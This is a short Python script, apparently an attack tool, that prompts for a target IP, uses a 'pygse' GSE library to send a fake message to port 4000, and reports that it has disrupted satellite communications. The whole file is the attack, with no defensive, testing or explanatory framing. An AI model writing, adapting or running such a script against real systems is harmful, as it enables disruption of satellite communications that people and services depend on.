from pygse import GSE
import sys

def disrupt_satellite(target):
    gse = GSE(target, 4000)
    gse.send_fake_message()
    print(f"Disrupted satellite communications at {target}")

def main():
    target = input("Enter target IP: ")
    disrupt_satellite(target)

if __name__ == "__main__":
    main()
